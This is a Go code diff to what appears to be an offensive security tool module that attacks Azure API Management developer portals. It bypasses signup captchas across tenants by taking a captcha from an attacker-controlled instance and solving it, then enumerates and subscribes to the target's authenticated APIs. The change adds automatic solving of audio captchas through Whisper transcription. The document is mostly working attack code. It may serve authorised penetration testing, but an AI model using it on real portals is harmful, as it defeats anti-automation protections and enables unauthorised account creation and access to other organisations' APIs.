@@ -9,9 +9,11 @@ import (
 	"fmt"
 	"io"
 	"log/slog"
+	"maps"
 	"net/http"
 	"os"
-	"maps"
+	"os/exec"
+	"path/filepath"
 	"strings"
 	"time"
 
@@ -186,35 +188,11 @@ func (m *APIMCrossTenantModule) enumPublic(client *http.Client, target, mgmtURL,
 func (m *APIMCrossTenantModule) bypassAndEnumAuthenticated(cfg plugin.Config, client *http.Client, target, mgmtURL, mgmtVersion string, out *pipeline.P[model.AurelianModel]) error {
 	attacker := strings.TrimRight(m.AttackerAPIM, "/")
 
-	// Fetch captcha from attacker APIM.
-	var captcha apimCaptchaResponse
-	captchaURL := fmt.Sprintf("%s/captcha-challenge?challengeType=visual", attacker)
-	if err := m.doJSON(client, http.MethodGet, captchaURL, nil, map[string]string{"Origin": attacker}, &captcha); err != nil {
-		return fmt.Errorf("fetching captcha: %w", err)
-	}
-
-	// Decode and save captcha image for user to solve.
-	imgBytes, err := base64.StdEncoding.DecodeString(captcha.ChallengeString)
+	// Try audio captcha + automatic transcription first; fall back to visual + manual input.
+	solution, captcha, challengeType, err := m.solveCaptcha(cfg, client, attacker)
 	if err != nil {
-		return fmt.Errorf("decoding captcha image: %w", err)
+		return fmt.Errorf("solving captcha: %w", err)
 	}
-	tmpFile, err := os.CreateTemp("", "apim-captcha-*.png")
-	if err != nil {
-		return fmt.Errorf("creating captcha temp file: %w", err)
-	}
-	defer os.Remove(tmpFile.Name())
-	if _, err := tmpFile.Write(imgBytes); err != nil {
-		return fmt.Errorf("writing captcha image: %w", err)
-	}
-	tmpFile.Close()
-
-	cfg.Info("captcha saved to %s", tmpFile.Name())
-	fmt.Fprint(os.Stderr, "Enter captcha solution: ")
-	solution, err := bufio.NewReader(os.Stdin).ReadString('\n')
-	if err != nil {
-		return fmt.Errorf("reading captcha solution: %w", err)
-	}
-	solution = strings.TrimSpace(solution)
 
 	// POST signup to target with attacker's captcha (cross-tenant bypass).
 	signupPayload := apimSignupRequest{
@@ -224,7 +202,7 @@ func (m *APIMCrossTenantModule) bypassAndEnumAuthenticated(cfg plugin.Config, cl
 				InputSolution: solution,
 			},
 			AzureRegion:   captcha.AzureRegion,
-			ChallengeType: "visual",
+			ChallengeType: challengeType,
 		},
 		SignupData: apimSignupData{
 			Email:        m.Email,
@@ -499,6 +477,92 @@ func (m *APIMCrossTenantModule) trySubscribeAll(client *http.Client, mgmtURL, mg
 			Context:            ctx,
 		})
 	}
+}
+
+// solveCaptcha attempts audio captcha + Whisper transcription first; falls back to visual + stdin.
+// Returns the solution text, captcha metadata, the challenge type used, and any error.
+func (m *APIMCrossTenantModule) solveCaptcha(cfg plugin.Config, client *http.Client, attacker string) (solution string, captcha apimCaptchaResponse, challengeType string, err error) {
+	solution, captcha, err = m.solveCaptchaAudio(client, attacker)
+	if err == nil {
+		cfg.Success("audio captcha auto-solved via whisper: %q", solution)
+		return solution, captcha, "audio", nil
+	}
+	slog.Warn("audio captcha auto-solve unavailable, falling back to visual", "reason", err)
+
+	// Visual fallback.
+	captchaURL := fmt.Sprintf("%s/captcha-challenge?challengeType=visual", attacker)
+	if err := m.doJSON(client, http.MethodGet, captchaURL, nil, map[string]string{"Origin": attacker}, &captcha); err != nil {
+		return "", captcha, "", fmt.Errorf("fetching visual captcha: %w", err)
+	}
+	imgBytes, decErr := base64.StdEncoding.DecodeString(captcha.ChallengeString)
+	if decErr != nil {
+		return "", captcha, "", fmt.Errorf("decoding captcha image: %w", decErr)
+	}
+	tmpFile, tmpErr := os.CreateTemp("", "apim-captcha-*.png")
+	if tmpErr != nil {
+		return "", captcha, "", fmt.Errorf("creating captcha temp file: %w", tmpErr)
+	}
+	defer os.Remove(tmpFile.Name())
+	if _, writeErr := tmpFile.Write(imgBytes); writeErr != nil {
+		tmpFile.Close()
+		return "", captcha, "", fmt.Errorf("writing captcha image: %w", writeErr)
+	}
+	tmpFile.Close()
+
+	cfg.Info("captcha image saved to %s", tmpFile.Name())
+	fmt.Fprint(os.Stderr, "Enter captcha solution: ")
+	line, readErr := bufio.NewReader(os.Stdin).ReadString('\n')
+	if readErr != nil {
+		return "", captcha, "", fmt.Errorf("reading captcha solution: %w", readErr)
+	}
+	return strings.TrimSpace(line), captcha, "visual", nil
+}
+
+// solveCaptchaAudio fetches an audio captcha and transcribes it via the `whisper` CLI.
+// Returns an error if the whisper CLI is not installed or transcription fails.
+func (m *APIMCrossTenantModule) solveCaptchaAudio(client *http.Client, attacker string) (solution string, captcha apimCaptchaResponse, err error) {
+	captchaURL := fmt.Sprintf("%s/captcha-challenge?challengeType=audio", attacker)
+	if err := m.doJSON(client, http.MethodGet, captchaURL, nil, map[string]string{"Origin": attacker}, &captcha); err != nil {
+		return "", captcha, fmt.Errorf("fetching audio captcha: %w", err)
+	}
+
+	audioBytes, err := base64.StdEncoding.DecodeString(captcha.ChallengeString)
+	if err != nil {
+		return "", captcha, fmt.Errorf("decoding audio captcha: %w", err)
+	}
+
+	tmpAudio, err := os.CreateTemp("", "apim-captcha-*.mp3")
+	if err != nil {
+		return "", captcha, fmt.Errorf("creating audio temp file: %w", err)
+	}
+	audioPath := tmpAudio.Name()
+	defer os.Remove(audioPath)
+
+	if _, err := tmpAudio.Write(audioBytes); err != nil {
+		tmpAudio.Close()
+		return "", captcha, fmt.Errorf("writing audio: %w", err)
+	}
+	tmpAudio.Close()
+
+	outDir, err := os.MkdirTemp("", "apim-whisper-*")
+	if err != nil {
+		return "", captcha, fmt.Errorf("creating whisper output dir: %w", err)
+	}
+	defer os.RemoveAll(outDir)
+
+	cmd := exec.Command("whisper", audioPath, "--model", "tiny", "--output_format", "txt", "--output_dir", outDir)
+	if out, cmdErr := cmd.CombinedOutput(); cmdErr != nil {
+		return "", captcha, fmt.Errorf("whisper CLI: %w (output: %s)", cmdErr, strings.TrimSpace(string(out)))
+	}
+
+	base := strings.TrimSuffix(filepath.Base(audioPath), ".mp3")
+	txtPath := filepath.Join(outDir, base+".txt")
+	text, err := os.ReadFile(txtPath)
+	if err != nil {
+		return "", captcha, fmt.Errorf("reading whisper output: %w", err)
+	}
+
+	return strings.TrimSpace(string(text)), captcha, nil
 }
 
 // fetchConfig retrieves the APIM portal config.json and returns the management API URL and version.
